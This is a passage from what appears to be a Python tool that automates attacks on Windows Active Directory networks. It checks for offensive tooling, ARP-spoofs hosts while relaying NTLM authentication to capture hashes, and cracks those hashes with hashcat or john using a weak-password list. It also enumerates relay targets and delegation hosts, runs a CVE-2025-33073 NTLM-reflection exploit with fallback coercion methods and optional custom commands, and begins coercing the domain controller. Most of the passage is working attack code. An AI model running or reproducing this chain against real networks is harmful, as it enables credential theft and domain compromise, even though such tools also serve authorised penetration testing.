        self.cfg.dc_fqdn = f"DC.{domain}"
        log.warning(f"DC FQDN: {self.cfg.dc_fqdn} (guessed — override with --dc-fqdn)")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Prerequisites
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _check_impacket_ntlmrelayx_consistency() -> bool:
    """Detect the impacket wrapper/library version mismatch where the
    stale CLI wrapper (e.g. /home/goad/.local/bin/ntlmrelayx.py from an
    old `pip install --user impacket`) calls
    `NTLMRelayxConfig.setRPCOptions(...)` with fewer args than the
    currently installed library expects, causing a TypeError on every
    invocation. Common after a system-wide `pip install --upgrade
    impacket` over an older user-site wrapper. Pure-introspection so
    it runs in milliseconds without spawning the binary.

    Returns True if no mismatch detected (or check skipped).
    Returns False (and logs a loud warning) if mismatch found."""
    if not tool_exists("impacket-ntlmrelayx"):
        return True

    script_path = shutil.which("impacket-ntlmrelayx")
    if not script_path:
        return True
    try:
        # Resolve symlink — the actual Python wrapper file we want to read
        actual_path = Path(script_path).resolve()
        content = actual_path.read_text(errors="replace")
    except Exception:
        return True  # can't read wrapper, skip check silently

    # Find how many positional args the wrapper passes
    m = re.search(r"\.setRPCOptions\s*\(([^)]*)\)", content)
    if not m:
        return True  # wrapper doesn't call setRPCOptions, no risk

    args_passed = [a.strip() for a in m.group(1).split(",") if a.strip()]
    n_passed = len(args_passed)

    # Find how many the installed library requires (Python introspection).
    # Class moved between minor versions; try the known module paths.
    cls = None
    for module_path in (
        "impacket.examples.ntlmrelayx.servers.config",
        "impacket.examples.ntlmrelayx.config",
        "impacket.examples.ntlmrelayx.utils.config",
    ):
        try:
            mod = __import__(module_path, fromlist=["NTLMRelayxConfig"])
            cls = getattr(mod, "NTLMRelayxConfig", None)
            if cls and hasattr(cls, "setRPCOptions"):
                break
        except (ImportError, AttributeError):
            continue
    if cls is None or not hasattr(cls, "setRPCOptions"):
        return True  # library not importable / class moved, skip silently

    try:
        import inspect
        sig = inspect.signature(cls.setRPCOptions)
        n_required = sum(
            1 for p in sig.parameters.values()
            if p.default is p.empty and p.name != "self"
        )
    except Exception:
        return True

    if n_passed < n_required:
        log.error(f"impacket version mismatch: {actual_path} calls "
                  f"setRPCOptions({n_passed} args), but the installed "
                  f"library requires {n_required}. Every ntlmrelayx "
                  f"invocation will crash with TypeError.")
        log.error("Affected phases: arp, wpad, wsus, exploit. Fix:")
        detail(f"  $ sudo rm {actual_path}")
        detail(f"  $ sudo apt --reinstall install impacket-scripts")
        detail(f"  (apt-managed wrappers stay in sync with python3-impacket; "
               f"pip-installed wrappers do not.)")
        return False
    return True


def check_prerequisites(cfg: Config) -> bool:
    log.info("🔧 Checking prerequisites...")
    missing = False
    # Track count of optional warnings emitted so the closing line
    # doesn't falsely claim "all prerequisites satisfied" when many
    # optional tools (mitm6, responder, certipy, bloodyAD, …) are
    # absent. We monkey-patch a counter onto the bound logger.
    optional_missing_count = [0]
    _orig_warn = log.warning
    def _counted_warn(msg, *a, **kw):
        optional_missing_count[0] += 1
        _orig_warn(msg, *a, **kw)
    log.warning = _counted_warn  # restored before return

    # Core exploit
    if not (CVE_DIR / "CVE-2025-33073.py").exists():
        log.error(f"CVE-2025-33073 PoC not found at {CVE_DIR}")
        missing = True

    # Required tools
    for tool in ["nxc", "impacket-findDelegation", "impacket-ntlmrelayx",
                 "impacket-secretsdump", "python3", "ip"]:
        if tool_exists(tool):
            log.debug(f"  ✓ {tool}")
        else:
            log.error(f"Required tool not found: {tool}")
            missing = True

    # Optional
    if tool_exists("dig"):
        ok("dig available (DNS discovery)")
    else:
        log.warning("dig not found — DNS auto-discovery limited (apt install dnsutils)")

    if (TOOLS_DIR / "krbrelayx").is_dir():
        ok("krbrelayx found")
    else:
        log.warning("krbrelayx not found (optional)")

    if tool_exists("arpspoof"):
        ok("arpspoof available (Layer 2 fallback)")
    elif tool_exists("bettercap"):
        ok("bettercap available (Layer 2 fallback)")
    else:
        log.warning("No ARP spoof tool (optional — apt install dsniff or bettercap)")

    if tool_exists("hashcat"):
        ok("hashcat available (hash cracking)")
    elif tool_exists("john"):
        ok("john available (hash cracking)")
    else:
        log.warning("No hash cracker found (optional — apt install hashcat)")

    # Passive discovery
    if tool_exists("tcpdump"):
        ok("tcpdump available (passive WPAD/WSUS/LLMNR sniffing)")
    else:
        log.warning("tcpdump not found (optional — apt install tcpdump)")

    # PXE tools
    pxethiefy_found = find_tool(
        "pxethiefy",
        paths=[TOOLS_DIR / "pxethiefy" / "pxethiefy.py"]
    )
    if pxethiefy_found:
        ok("pxethiefy available (PXE/SCCM credential extraction)")
    else:
        log.warning("pxethiefy not found (optional — manual TFTP extraction still works)")

    if tool_exists("tftp") or tool_exists("atftp"):
        ok("TFTP client available (PXE image download)")
    else:
        log.warning("No TFTP client found (optional — apt install tftp)")

    if tool_exists("wimlib-imagex"):
        ok("wimtools available (WIM image mounting)")
    else:
        log.warning("wimtools not found (optional — apt install wimtools)")

    # WPAD tools
    if tool_exists("mitm6"):
        ok("mitm6 available (IPv6 WPAD poisoning)")
    else:
        log.warning("mitm6 not found (optional — pipx install mitm6)")

    if tool_exists("responder"):
        ok("responder available (LLMNR/WPAD poisoning)")
    else:
        log.warning("responder not found (optional — apt install responder)")

    # WSUS tools
    if tool_exists("wsuks"):
        ok("wsuks available (WSUS exploitation)")
    else:
        log.warning("wsuks not found (optional — pipx install wsuks)")

    # AD CS tools
    if tool_exists("certipy"):
        ok("certipy available (AD CS ESC1-ESC16 exploitation)")
    else:
        log.warning("certipy not found (optional — apt install certipy-ad)")

    # Roasting tools
    if tool_exists("impacket-GetUserSPNs"):
        ok("GetUserSPNs available (Kerberoasting)")
    if tool_exists("impacket-GetNPUsers"):
        ok("GetNPUsers available (AS-REP Roasting)")

    # SCCM tools
    sccmhunter_path = find_tool("sccmhunter",
        paths=[TOOLS_DIR / "sccmhunter" / "sccmhunter.py"])
    if sccmhunter_path:
        ok("sccmhunter available (SCCM NAA extraction)")
    else:
        log.warning("sccmhunter not found (optional)")

    # Shadow Credentials
    pywhisker_path = find_tool("pywhisker",
        paths=[TOOLS_DIR / "pywhisker" / "pywhisker.py"])
    if pywhisker_path:
        ok("pywhisker available (Shadow Credentials)")
    else:
        log.warning("pywhisker not found (optional — ntlmrelayx --shadow-credentials still works)")

    # RBCD / delegation tools
    if tool_exists("impacket-addcomputer"):
        ok("addcomputer available (RBCD machine account)")
    if tool_exists("impacket-getST"):
        ok("getST available (S4U2Proxy)")

    # DPAPI
    if tool_exists("impacket-dpapi"):
        ok("impacket-dpapi available (DPAPI backup key extraction)")

    # ── impacket-ntlmrelayx wrapper/library version-mismatch trap ──────
    # When pip-install impacket leaves a stale wrapper script in
    # ~/.local/bin/ and the library is later upgraded, the wrapper calls
    # setRPCOptions() with fewer args than the new library expects → every
    # ntlmrelayx invocation dies with TypeError before it can do anything.
    # This breaks every L2/relay phase (arp, wpad, wsus, exploit). Detect
    # by introspection — fast (<10 ms) and reliable.
    _check_impacket_ntlmrelayx_consistency()

    # ── v4.9.0 additions ────────────────────────────────────────────────
    # Discover phase
    if tool_exists("kerbrute"):
        ok("kerbrute available (KRB-AS-REQ user enumeration)")
    else:
        log.warning("kerbrute not found (--phase discover degraded — only CLDAP enum)")

    if tool_exists("userenum-cldap") or (TOOLS_DIR / "userenum-cldap.py").exists():
        ok("userenum-cldap available (CLDAP NetLogon ping enumeration)")
    else:
        log.warning("userenum-cldap not found (--phase discover degraded — only kerbrute enum)")

    try:
        import asn1tools  # noqa: F401
        ok("asn1tools available (CLDAP userenum runtime)")
    except ImportError:
        log.warning("asn1tools missing (CLDAP userenum will silently no-op — pip install asn1tools)")

    # SecLists presence — major impact on discover candidate breadth
    if any(Path(p).is_file() for p in _SECLISTS_USER_PATHS):
        ok("SecLists found (rich --phase discover candidates)")
    else:
        log.warning("SecLists not installed (--phase discover degraded to 24-name shortlist) — apt install seclists OR git clone https://github.com/danielmiessler/SecLists /usr/share/seclists")

    # bloodyAD (used by ghost-SPN, RBCD, shadow creds, GPO abuse)
    if tool_exists("bloodyAD") or tool_exists("bloodyad"):
        ok("bloodyAD available (LDAP write helper)")
    else:
        log.warning("bloodyAD not found (--phase exploit / shadow / RBCD / GPO degraded — pipx install bloodyAD)")

    # BloodHound collection + auto-action
    if tool_exists("bloodhound-python"):
        ok("bloodhound-python available (--phase bloodhound + auto-action)")
    else:
        log.warning("bloodhound-python not found (--phase bloodhound disabled — apt install bloodhound.py OR pipx install bloodhound)")

    # Loot phase
    if tool_exists("smbclient"):
        ok("smbclient available (--phase loot file pulls)")
    else:
        log.warning("smbclient not found (--phase loot KeePass download disabled — apt install smbclient)")

    if tool_exists("keepass2john"):
        ok("keepass2john available (--phase loot KeePass cracking)")
    else:
        log.warning("keepass2john not found (--phase loot KeePass crack disabled — apt install john)")

    # TGS rewrite (optional — has impacket fallback)
    tgssub_path = find_tool("tgssub.py", paths=[TOOLS_DIR / "tgssub" / "tgssub.py"])
    if tgssub_path:
        ok("tgssub.py available (KCD bypass primitive)")
    else:
        detail("tgssub.py not found (--phase tgs-rewrite uses impacket fallback)")

    # Coercion helpers
    if tool_exists("coercer"):
        ok("coercer available (DHCP/PetitPotam multi-method coercion)")
    else:
        log.warning("coercer not found (DHCP coercion phase disabled — pipx install coercer)")

    log.warning = _orig_warn  # restore before returning
    if missing:
        log.error("Missing required prerequisites — see warnings above for "
                  "install hints (apt / pipx / pip).")
        return False
    n_opt = optional_missing_count[0]
    if n_opt:
        ok(f"Required prerequisites satisfied ({n_opt} optional tool(s) missing — see ⚠ above)")
    else:
        ok("All prerequisites satisfied")
    return True


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 0: ARP Spoof + Credential Capture
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def discover_live_hosts(cfg: Config) -> list[str]:
    """Scan subnet for live hosts."""
    log.info("📡 Discovering live hosts...")
    hosts_file = cfg.work_dir / "live-hosts.txt"

    if tool_exists("nmap"):
        result = run(["nmap", "-sn", "-n", cfg.target_net], cfg, timeout=120)
        hosts = re.findall(r"Nmap scan report for (\d+\.\d+\.\d+\.\d+)", result.stdout)
    elif tool_exists("arp-scan"):
        result = run(["arp-scan", "-I", cfg.iface or "eth0", cfg.target_net], cfg, timeout=60)
        hosts = re.findall(r"^(\d+\.\d+\.\d+\.\d+)", result.stdout, re.MULTILINE)
    else:
        log.error("Need nmap or arp-scan for host discovery")
        return []

    # Filter out self and gateway
    hosts = [h for h in hosts if h not in (cfg.attacker_ip, cfg.gateway)]
    hosts_file.write_text("\n".join(hosts) + "\n")

    if hosts:
        ok(f"Found {len(hosts)} live host(s)")
        for h in hosts:
            detail(h)
    else:
        log.warning("No live hosts found")
    return hosts


def arp_spoof_relay(target: str, cfg: Config) -> bool:
    """ARP spoof target ↔ gateway and relay NTLM auth. Returns True if creds captured."""
    gateway = cfg.gateway
    log.info(f"🕸️  ARP spoof: {target} ↔ {gateway}")

    if cfg.dry_run:
        log.warning(f"Dry run — would ARP spoof {target} ↔ {gateway}")
        return True

    spoof_tool = find_tool("arpspoof", "bettercap")
    if not spoof_tool:
        log.error("No ARP spoof tool found (need arpspoof or bettercap)")
        return False

    relay_output = cfg.work_dir / f"arp-relay-{target}.txt"
    hash_output = cfg.work_dir / "arp-relay-hashes"
    bg_procs = []

    # Enable IP forwarding
    old_forward = "0"
    try:
        old_forward = Path("/proc/sys/net/ipv4/ip_forward").read_text().strip()
        Path("/proc/sys/net/ipv4/ip_forward").write_text("1")
        log.debug("IP forwarding enabled")
    except OSError as e:
        log.error(f"Cannot enable IP forwarding: {e}")
        return False

    try:
        # Start ntlmrelayx
        log.info("🎣 Starting ntlmrelayx listener...")
        relay_proc = run(
            ["impacket-ntlmrelayx", "-t", target, "-smb2support",
             "--no-http-server", "-of", str(hash_output)],
            cfg, bg=True, outfile=relay_output
        )
        if not hasattr(relay_proc, 'poll'):
            log.error("Failed to start ntlmrelayx")
            return False
        bg_procs.append(relay_proc)
        time.sleep(2)
        if relay_proc.poll() is not None:
            log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
            return False

        # Start ARP spoof
        iface = cfg.iface or "eth0"
        if "bettercap" in spoof_tool:
            log.info(f"🔀 Bettercap ARP spoof: {target} ↔ {gateway}")
            spoof_proc = run(
                ["bettercap", "-iface", iface, "-eval",
                 f"set arp.spoof.targets {target}; set arp.spoof.internal true; arp.spoof on"],
                cfg, bg=True, outfile=cfg.work_dir / "arp-spoof.txt"
            )
            if hasattr(spoof_proc, 'poll'):
                bg_procs.append(spoof_proc)
        else:
            log.info(f"🔀 ARP spoof: {target} → thinks we are {gateway}")
            p1 = run(
                ["arpspoof", "-i", iface, "-t", target, gateway],
                cfg, bg=True, outfile=cfg.work_dir / f"arp-spoof-{target}-1.txt"
            )
            log.info(f"🔀 ARP spoof: {gateway} → thinks we are {target}")
            p2 = run(
                ["arpspoof", "-i", iface, "-t", gateway, target],
                cfg, bg=True, outfile=cfg.work_dir / f"arp-spoof-{target}-2.txt"
            )
            for p in [p1, p2]:
                if hasattr(p, 'poll'):
                    bg_procs.append(p)

        # Wait for captured auth
        ok("ARP spoof + relay running, waiting for NTLM traffic...")
        max_wait = cfg.poison_duration
        waited = 0
        while waited < max_wait:
            if relay_output.exists():
                content = relay_output.read_text()
                if re.search(r"authenticated|SAM|hash|success|SUCCEED", content, re.IGNORECASE):
                    ok("🎣 Captured NTLM authentication!")
                    return True
            time.sleep(5)
            waited += 5
            if waited % 30 == 0:
                log.info(f"⏳ Still listening... ({waited}/{max_wait}s)")

        log.warning(f"No auth captured within {max_wait}s")
        return False

    finally:
        # Stop all background processes
        log.info("🛑 Stopping ARP spoof...")
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        # Remove from global bg list
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)
        # Restore IP forwarding
        try:
            Path("/proc/sys/net/ipv4/ip_forward").write_text(old_forward)
        except Exception:
            pass


def extract_hashes(cfg: Config) -> list[str]:
    """Extract NTLMv2 hashes from all output files."""
    hashfile = cfg.work_dir / "captured-ntlmv2.txt"
    hashes = set()

    # From relay/responder output
    for f in cfg.work_dir.glob("arp-relay-*.txt"):
        content = f.read_text()
        hashes.update(re.findall(r"\S+::\S+:[a-fA-F0-9]+:[a-fA-F0-9]+:[a-fA-F0-9]+", content))

    # From hash output files
    for f in cfg.work_dir.glob("arp-relay-hashes*"):
        if f.exists():
            hashes.update(line.strip() for line in f.read_text().splitlines() if "::" in line)

    # Responder logs
    responder_dir = Path("/usr/share/responder/logs")
    if responder_dir.is_dir():
        for f in responder_dir.glob("*NTLMv2*.txt"):
            hashes.update(line.strip() for line in f.read_text().splitlines() if "::" in line)

    if hashes:
        hashfile.write_text("\n".join(sorted(hashes)) + "\n")
        ok(f"Extracted {len(hashes)} unique NTLMv2 hash(es)")
    return sorted(hashes)


def try_crack_hashes(cfg: Config) -> Optional[tuple[str, str, str]]:
    """Crack NTLMv2 hashes. Returns (user, password, domain) or None."""
    hashfile = cfg.work_dir / "captured-ntlmv2.txt"
    cracked_file = cfg.work_dir / "cracked.txt"

    if not hashfile.exists() or hashfile.stat().st_size == 0:
        return None

    log.info("🔓 Attempting to crack NTLMv2 hashes...")

    # Quick check: extract usernames from hashes and try username=password
    # NTLMv2 format: USER::DOMAIN:challenge:response:blob
    usernames = set()
    for line in hashfile.read_text().splitlines():
        if "::" in line:
            user = line.split("::")[0].strip()
            if user:
                usernames.add(user)

    if usernames:
        # Build a mini wordlist with common weak patterns per user
        mini_wl = cfg.work_dir / "quick-crack-wordlist.txt"
        patterns = []
        for u in usernames:
            patterns += [
                u, u.lower(), u.upper(), u.capitalize(),
                f"{u}1", f"{u}123", f"{u}!", f"{u}1!",
                u[::-1],  # reversed
            ]
        # Add generic weak passwords
        patterns += [
            "password", "Password1", "Password123", "P@ssw0rd", "P@ssword1",
            "Welcome1", "Welcome123", "Changeme1", "Winter2024", "Winter2025",
            "Winter2026", "Summer2024", "Summer2025", "Summer2026",
            "Company1", "Company123", "Admin123", "admin", "letmein",
            "qwerty", "123456", "abc123", "iloveyou", "monkey",
        ]
        mini_wl.write_text("\n".join(patterns) + "\n")
        log.info(f"⚡ Quick-crack: trying {len(patterns)} username-based patterns first...")

        if tool_exists("hashcat"):
            run(
                ["hashcat", "-m", "5600", str(hashfile), str(mini_wl),
                 "--outfile", str(cracked_file), "--outfile-format=2", "--quiet",
                 "--runtime=10"],
                cfg, timeout=15
            )
        elif tool_exists("john"):
            run(["john", "--format=netntlmv2", f"--wordlist={mini_wl}", str(hashfile),
                 "--max-run-time=10"],
                cfg, timeout=15)

        if cracked_file.exists() and cracked_file.stat().st_size > 0:
            ok("⚡ Quick-crack hit! Username-based password found")

    # Find wordlist (prefer uncompressed, auto-decompress .gz)
    wordlist = None
    for wl in WORDLISTS:
        if wl.exists() and wl.suffix != ".gz":
            wordlist = wl
            break
        if wl.suffix == ".gz" and wl.exists():
            plain = wl.with_suffix("")
            if plain.exists():
                wordlist = plain
                break
            log.info(f"📦 Decompressing {wl.name}...")
            run(["gunzip", "-k", str(wl)], cfg)
            if plain.exists():
                wordlist = plain
                break

    if not wordlist:
        log.warning("No wordlist found for cracking")
        return None

    if tool_exists("hashcat"):
        log.info(f"⚙️  hashcat (NTLMv2/5600) with {wordlist.name}...")
        result = run(
            ["hashcat", "-m", "5600", str(hashfile), str(wordlist),
             "--outfile", str(cracked_file), "--outfile-format=2", "--quiet",
             "--runtime=90"],  # Hard cap: 90 seconds
            cfg, timeout=120   # Process kill safety net
        )
    elif tool_exists("john"):
        log.info(f"⚙️  john the ripper with {wordlist.name}...")
        run(["john", "--format=netntlmv2", f"--wordlist={wordlist}", str(hashfile),
             f"--max-run-time=90"],  # Hard cap: 90 seconds
            cfg, timeout=120)
        result = run(["john", "--show", "--format=netntlmv2", str(hashfile)], cfg)
        if result.stdout:
            lines = [l for l in result.stdout.splitlines()
                     if l.strip() and "password hash" not in l.lower()]
            cracked_file.write_text("\n".join(lines) + "\n")
    else:
        log.warning("Neither hashcat nor john found")
        return None

    if cracked_file.exists() and cracked_file.stat().st_size > 0:
        cracked_pass = _first_line(cracked_file.read_text())
        # Parse user::domain from the hash
        hash_line = _first_line(hashfile.read_text())
        parts = hash_line.split(":")
        user = parts[0] if len(parts) > 0 else ""
        domain = parts[2] if len(parts) > 2 else ""

        # john output may include "user:pass"
        if ":" in cracked_pass and "\\" not in cracked_pass:
            cracked_pass = cracked_pass.split(":", 1)[-1]

        if user and cracked_pass:
            success_box(f"CRACKED: {domain}\\{user}")
            detail(f"Password: {cracked_pass}")
            return (user, cracked_pass, domain)

    log.warning("No passwords cracked with quick wordlist attack")
    return None


def run_arp_capture(cfg: Config, priority_hosts: list[str] | None = None) -> bool:
    """ARP spoof subnet to capture and crack NTLM hashes. Sets cfg creds on success.

    Args:
        priority_hosts: Hosts from passive sniffing that are actively sending
                       LLMNR/WPAD/WSUS/DHCPv6 traffic — these are spoofed first
                       since they're most likely to yield NTLM auth.
    """
    phase_header("PHASE 0: ZERO-AUTH CREDENTIAL CAPTURE (ARP SPOOF)")

    targets = []
    if cfg.specific_target:
        targets = [cfg.specific_target]
    elif cfg.target_net:
        targets = discover_live_hosts(cfg)
    else:
        log.error("No target specified and no subnet detected")
        return False

    if not targets:
        return False

    # Prioritize hosts from passive sniffing (they're actively authenticating)
    if priority_hosts:
        priority = [h for h in priority_hosts if h in targets and h != cfg.attacker_ip]
        rest = [h for h in targets if h not in priority]
        if priority:
            ok(f"Prioritizing {len(priority)} host(s) detected by passive sniff")
            for h in priority:
                detail(h)
            targets = priority + rest

    total = len(targets)
    for i, host in enumerate(targets, 1):
        log.info(f"[{i}/{total}] ARP spoof relay: {host} ↔ {cfg.gateway}")
        arp_spoof_relay(host, cfg)

        # Check for captured hashes
        hashes = extract_hashes(cfg)
        if hashes:
            creds = try_crack_hashes(cfg)
            if creds:
                cfg.username, cfg.password, cfg.domain = creds
                ok("🔑 Credentials captured and cracked — switching to authenticated mode")
                return True

    # Final crack attempt
    hashes = extract_hashes(cfg)
    if hashes:
        creds = try_crack_hashes(cfg)
        if creds:
            cfg.username, cfg.password, cfg.domain = creds
            return True

    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 1: Enumeration
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def enumerate_targets(cfg: Config) -> tuple[list[str], list[str]]:
    """Find relay targets and delegation hosts. Returns (relay_targets, deleg_hosts)."""
    phase_header(f"PHASE 1: TARGET ENUMERATION ({cfg.target_net})")

    relay_list = cfg.work_dir / "relay-targets.txt"
    smb_output = cfg.work_dir / "smb-enum.txt"
    deleg_output = cfg.work_dir / "delegation.txt"

    # --- SMB signing scan ---
    log.info("🔍 Scanning for hosts without SMB signing...")
    result = run(
        ["nxc", "smb", cfg.target_net, "--gen-relay-list", str(relay_list)],
        cfg, timeout=300, outfile=smb_output
    )
    print(result.stdout)

    relay_targets = []
    if relay_list.exists():
        relay_targets = [l.strip() for l in relay_list.read_text().splitlines() if l.strip()]

    # Remove DC (always has signing)
    if cfg.dc_ip in relay_targets:
        relay_targets.remove(cfg.dc_ip)
        relay_list.write_text("\n".join(relay_targets) + "\n")

    if relay_targets:
        ok(f"Found {len(relay_targets)} relay target(s)")
        for t in relay_targets:
            detail(t)
    else:
        log.warning("No relay targets found (all hosts have SMB signing)")
        log.warning("Try --smb-signing to relay via LDAPS instead")

    # CVE-2026-24294 / 26128 LPE candidates (Synacktiv 2026)
    detect_loopback_candidates(cfg, smb_output)

    # --- Delegation scan ---
    separator()
    log.info("🔍 Looking for unconstrained delegation hosts...")
    result = run(
        ["impacket-findDelegation"] + cfg.auth_args + ["-dc-ip", cfg.dc_ip],
        cfg, timeout=60, outfile=deleg_output
    )
    print(result.stdout)

    deleg_hosts = []
    if deleg_output.exists():
        for line in deleg_output.read_text().splitlines():
            if re.search(r"unconstrained", line, re.IGNORECASE):
                parts = line.split()
                if len(parts) >= 2:
                    deleg_hosts.append(parts[1])

    if deleg_hosts:
        ok(f"Unconstrained delegation host(s) found:")
        (cfg.work_dir / "unconstrained-hosts.txt").write_text("\n".join(deleg_hosts) + "\n")
        for h in deleg_hosts:
            detail(h)
    else:
        log.warning("No unconstrained delegation — DC compromise phase will be limited")

    # --- Cross-reference: high-value targets ---
    high_value = []
    if deleg_hosts and relay_targets and tool_exists("dig"):
        separator()
        log.info("🔗 Cross-referencing relay targets with delegation hosts...")
        for dh in deleg_hosts:
            try:
                out = subprocess.check_output(
                    ["dig", "+short", "A", f"{dh}.{cfg.domain}"], text=True, timeout=5,
                    stderr=subprocess.DEVNULL
                )
                ip = out.strip().splitlines()[0] if out.strip() else ""
                if ip in relay_targets:
                    ok(f"🎯 HIGH VALUE: {dh} ({ip}) — relay + unconstrained delegation")
                    high_value.append(ip)
            except Exception:
                pass

    if high_value:
        (cfg.work_dir / "high-value-targets.txt").write_text("\n".join(high_value) + "\n")

    return relay_targets, deleg_hosts


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 2: CVE-2025-33073 Exploitation
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_cve_exploit(target: str, method: str, cfg: Config,
                    label: str = "") -> bool:
    """Run the CVE-2025-33073 PoC with a specific method."""
    output_file = cfg.work_dir / f"exploit-{target}-{method}.txt"
    args = [
        "python3", str(CVE_DIR / "CVE-2025-33073.py"),
        "-u", f"{cfg.domain}\\{cfg.username}",
        "--attacker-ip", cfg.attacker_ip,
        "--dns-ip", cfg.dc_ip,
        "--dc-fqdn", cfg.dc_fqdn,
        "--target", target,
        "--target-ip", target,
    ]

    # Auth
    if cfg.nthash:
        args += ["-p", f"aad3b435b51404eeaad3b435b51404ee:{cfg.nthash}"]
    else:
        args += ["-p", cfg.password]

    if method:
        args += ["-M", method]
    if cfg.use_socks:
        args += ["--socks"]
    if cfg.smb_signing:
        args += ["--smb-signing"]
    if cfg.custom_cmd:
        args += ["--custom-command", cfg.custom_cmd]

    log.info(f"⚔️  {label or 'Exploit'}: method={method}")
    result = run(args, cfg, timeout=300, outfile=output_file)
    if not cfg.dry_run:
        print(result.stdout[-2000:] if len(result.stdout) > 2000 else result.stdout)
    return result.returncode == 0


def exploit_target(target: str, cfg: Config) -> bool:
    """Exploit a target with fallback coercion methods."""
    phase_header(f"PHASE 2: NTLM REFLECTION EXPLOIT ({target})")

    if cfg.use_socks:
        log.info("🧦 SOCKS proxy mode — post-exploit: proxychains nxc smb ...")
    if cfg.smb_signing:
        log.info("🔏 SMB signing bypass enabled (LDAPS relay)")
    if cfg.custom_cmd:
        log.info(f"💻 Custom command: {cfg.custom_cmd}")

    # User specified a method — no fallback
    if cfg.method:
        success = run_cve_exploit(target, cfg.method, cfg)
        if success:
            ok(f"Exploitation succeeded on {target} (method: {cfg.method})")
            (cfg.work_dir / f"working-method-{target}.txt").write_text(cfg.method)
        else:
            log.error(f"Exploitation failed on {target} (method: {cfg.method})")
        return success

    # Auto-fallback: try each method
    total = len(COERCION_METHODS)
    for i, method in enumerate(COERCION_METHODS, 1):
        if run_cve_exploit(target, method, cfg, label=f"Attempt {i}/{total}"):
            ok(f"Exploitation succeeded on {target} (method: {method})")
            (cfg.work_dir / f"working-method-{target}.txt").write_text(method)
            return True
        if i < total:
            log.warning(f"Method {method} failed, trying next...")

    # Retry all with SMB signing bypass
    if not cfg.smb_signing:
        log.warning("All standard methods failed — retrying with --smb-signing (LDAPS)...")
        cfg.smb_signing = True
        for method in COERCION_METHODS:
            if run_cve_exploit(target, method, cfg, label=f"SMB-signing bypass ({method})"):
                ok(f"Exploitation succeeded (method: {method} + smb-signing)")
                (cfg.work_dir / f"working-method-{target}.txt").write_text(f"{method}+smb-signing")
                cfg.smb_signing = False
                return True
        cfg.smb_signing = False

    # Unicode-SPN Kerberos reflection (Synacktiv 2026 — bypasses CVE-2025-33073 patch)
    if cfg.unicode_spn and cfg.has_creds:
        log.warning("NTLM reflection methods failed — trying Kerberos Unicode-SPN reflection...")
        target_fqdn = target
        if "." not in target and "." in cfg.dc_fqdn and tool_exists("dig"):
            try:
                rev = subprocess.check_output(
                    ["dig", "+short", "-x", target], text=True, timeout=5,
                    stderr=subprocess.DEVNULL,
                ).strip().rstrip(".")
                if rev:
                    target_fqdn = rev.splitlines()[0]
            except Exception:
                pass
        if run_kerberos_reflection(target_fqdn, cfg):
            (cfg.work_dir / f"working-method-{target}.txt").write_text("unicode-spn")
            return True

    # Last resort: ARP spoof
    if not cfg.no_arp:
        log.warning("All coercion methods failed — falling back to ARP spoof relay...")
        if arp_spoof_relay(target, cfg):
            ok(f"ARP spoof relay succeeded on {target}")
            (cfg.work_dir / f"working-method-{target}.txt").write_text("arp-spoof")
            return True

    fail_box(f"All methods exhausted on {target}")
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 3: DC Compromise
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def try_dc_coercion(listener: str, cfg: Config) -> bool:
    """Try multiple coercion tools against the DC. Returns True on success."""
    coerce_output = cfg.work_dir / "coercion.txt"

    methods = [
        ("PetitPotam (MS-EFSR)", _coerce_petitpotam),
        ("PrinterBug (MS-RPRN)", _coerce_printerbug),
        ("DFSCoerce (MS-DFSNM)", _coerce_dfscoerce),
        ("ShadowCoerce (MS-FSRVP)", _coerce_shadowcoerce),
        ("Coercer (all-in-one)", _coerce_coercer),
    ]

    for i, (name, func) in enumerate(methods, 1):
        log.info(f"🔨 DC coercion [{i}/{len(methods)}]: {name}")
        if func(listener, cfg, coerce_output):
            ok(f"{name} coercion succeeded")
            (cfg.work_dir / "working-coercion.txt").write_text(name)
            return True
        if i < len(methods):
            log.warning(f"{name} failed, trying next...")

    log.error("All DC coercion methods failed")
    return False


def _build_coerce_auth(cfg: Config) -> list[str]:
    if cfg.nthash:
        return ["-u", cfg.username, "-d", cfg.domain, "-hashes", f":{cfg.nthash}"]
    return ["-u", cfg.username, "-d", cfg.domain, "-p", cfg.password]


def _coerce_petitpotam(listener: str, cfg: Config, outfile: Path) -> bool:
    cmd = find_tool(
        "impacket-PetitPotam",
        paths=[Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py")]
    )
    if not cmd:
        log.warning("PetitPotam not found, skipping")
        return False
    parts = cmd.split() + _build_coerce_auth(cfg) + [listener, cfg.dc_ip]
    result = run(parts, cfg, timeout=60, outfile=outfile)
    return _check_coerce_output(result, outfile)


def _coerce_printerbug(listener: str, cfg: Config, outfile: Path) -> bool:
    cmd = find_tool(
        "printerbug.py",
        paths=[TOOLS_DIR / "krbrelayx" / "printerbug.py"]
    )
    if not cmd:
